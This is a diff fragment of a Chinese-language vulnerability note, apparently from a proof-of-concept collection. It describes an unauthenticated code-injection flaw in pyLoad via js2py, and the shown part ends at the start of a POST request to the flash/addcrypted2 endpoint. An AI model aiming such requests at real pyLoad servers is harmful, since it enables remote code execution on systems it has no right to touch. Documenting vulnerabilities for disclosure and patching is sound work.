@@ -4,7 +4,7 @@ pyLoad是一个用 Python 编写的免费和开源下载管理器，可用于NAS
 
 pyLoad 存在代码注入漏洞，未经身份验证的攻击者可以通过滥用 js2py 功能执行任意 Python 代码。
 
-## poc
+## POC
 ```
 POST flash/addcrypted2 HTTP/1.1
 Host:127.0.0.1
